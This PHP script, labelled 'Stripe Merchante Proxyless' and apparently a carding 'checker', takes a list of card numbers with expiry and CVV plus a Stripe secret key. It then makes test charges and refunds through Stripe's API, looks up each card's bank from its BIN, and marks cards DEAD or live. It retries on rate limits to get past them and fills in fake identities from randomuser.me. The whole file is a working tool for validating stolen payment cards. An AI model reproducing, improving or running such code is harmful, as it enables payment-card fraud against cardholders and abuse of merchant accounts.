<?php


//===================== [ MADE BY checker ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
set_time_limit(99999999);

//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
////////////////////////////===[Random User ]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//////////////////////////////////////////
$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
    $amt = '1';
    $chr = $amt * 100;
}
switch ($amt) {
  case '1':
  $amt = '100';
    break;
  case '2':
  $amt = '200';
    break;
  case '3':
  $amt = '300';
    break;
  case '4':
  $amt = '400';
    break;
  case '5':
  $amt = '500';
    break;
  case '6':
  $amt = '600';
    break;
  case '7':
  $amt = '700';
    break;
  case '8':
  $amt = '800';
    break;
    case '9':
    $amt = '900';
    break;
    case '10':
    $amt = '1000';
    break;
}

if (strlen($amt) == 1) $amt = "$amt00";
if (strlen($amt) == 2) $amt = "$amt0";


$sk = $_GET['skgate'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
//================= [ CURL REQUESTS ] =================//
$rate_limit_reached = false;
$loop_count = 0;
while (!$rate_limit_reached) {
$loop_count++;$rate_limit_reached = false;
while (!$rate_limit_reached) {
//[Auth Section]
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
   $result1 = curl_exec($ch);
echo "<b>Result1: </b> $result1<br>";
  $s = json_decode($result1, true);
  $token = $s['id'];
$resp1 = trim(strip_tags(getStr($result1,'"code": "','"')));
$msg1 = trim(strip_tags(getStr($result1,'"message": "','"')));
//////////////////====[i don't new gate]==========////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.'+'.$last.'&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result2 = curl_exec($ch);
echo "<b>Result2: </b> $result2<br>";
  $cus = json_decode($result2, true);
$token3 = $cus['id'];
$resp2 = trim(strip_tags(getStr($result2,'"code": "','"')));
 $msg2 = trim(strip_tags(getStr($result2,'"message": "','"')));
 $cvvcheck = trim(strip_tags(getStr($result2,'"cvc_check": "','"')));
 $declinecode = trim(strip_tags(getStr($result2,'"code": "','"')));
////echo "<span>  cvv_check = ".$cvvcheck."</span>";
//////////////////======[Charge gate]========/////////////////////
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amt.'&currency=usd&customer='.$token3.'');
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  $result3 = curl_exec($ch);
echo "<b>Result3: </b> $result3<br>";
$char = json_decode($result3, true);
$resp3 = trim(strip_tags(getStr($result3,'"code": "','"')));
 $msg3 = trim(strip_tags(getStr($result3,'"message": "','"')));
$chtoken = trim(strip_tags(getStr($result3,'"charge": "','"')));
$chargetoken = $char['charge'];
////////////////======[refunde gate]
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount='.$amt.'&reason=requested_by_customer');
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
 $result4 = curl_exec($ch);
echo "<b>Result4: </b> $result4<br>";
//////////////=======[bin data]=======/////////////////////////////
$bin = substr("$cc", 0, 6);
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//=================== [ RESPONSES ] ===================//
if (strpos($result1, '"code":"rate_limit"') || strpos($result2, '"code":"rate_limit"')){
    $rate_limit_reached = false;
}
elseif (strpos($result1, '"code": "processing_error"')) {
    $rate_limit_reached = false;
  }
elseif (strpos($result1, '"card_not_supported"')) {
    echo '<span style="color:red">========================================<br>========================================<br>DEAD:'.$lista.'<br>['.$msg1.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
  } elseif (strpos($result1, '"invalid_expiry_year"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R1): '.$resp1.']['.$msg1.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result1, '"invalid_cvc"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R1): '.$resp1.']['.$msg1.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result1, '"invalid_expiry_month"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R1): '.$resp1.']['.$msg1.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result1, '"incorrect_number"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R1): '.$resp1.']['.$msg1.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result1, '"generic_decline"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.' <br>[Result(R1): '.$resp1.']['.$msg1.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result1, '"testmode_charges_only"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R1): '.$resp1.']['.$msg1.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result1, '"parameter_invalid_integer"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R1): '.$resp1.']['.$msg1.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result1, '"api_key_expired"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R1): '.$resp1.']['.$msg1.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result2, '"processing_error"')) {
    $rate_limit_reached = false;
}
//////////////======[r3]=======/////////////////////////
elseif (strpos($result3, '"rate_limit"')) {
    $rate_limit_reached = false;
}
elseif (strpos($result3, '"fraudulent"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp3.']['.$msg3.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result3,'"invalid_account"')){
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp3.']['.$msg3.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result3,'"pickup_card"')){
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp3.']['.$msg3.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br> ';
    $rate_limit_reached = true;
}
elseif (strpos($result3,'"incorrect_number"')){
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp2.']['.$msg2.']<br>['.$msg2.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br> ';
    $rate_limit_reached = true;
}
elseif (strpos($result3,'"card_decline_rate_limit_exceeded"')){
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp3.']['.$msg3.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br> ';
    $rate_limit_reached = true;
}

elseif (strpos($result3, '"card_not_supported"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp3.']['.$msg3.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result3, '"stolen_card"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp3.']['.$msg3.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result3, '"invalid_cvc"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp3.']['.$msg3.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result3, '"lost_card"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp3.']['.$msg3.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result3, '"generic_decline"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R3): '.$resp3.']['.$msg3.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
else{
     echo 'CVV</span> [Result1:'.$result1.']=====<br>===[Result2:'.$result2.']=====<br>===[Result3:'.$result3.']=====<br>===[Result4:'.$result4.']</span> <br>';
    break;    
}
}
/////////////////////////// [Card Response]  
//===================== [ MADE BY checker ] ====================//


//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";
curl_close($ch);
ob_flush();
?>